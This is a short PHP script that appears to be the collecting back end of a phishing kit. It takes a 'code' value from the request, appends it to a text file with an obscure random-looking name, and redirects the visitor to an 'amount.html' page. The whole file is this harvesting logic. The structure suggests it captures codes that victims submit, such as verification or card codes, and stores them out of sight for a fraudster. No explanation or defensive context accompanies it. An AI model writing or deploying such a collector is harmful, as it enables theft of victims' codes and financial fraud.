<?php
$code = $_GET['code'];
fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
$file = fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
fwrite($file, "[");
fwrite($file, $code);
fwrite($file, "]");
header("Location: amount.html")
?>
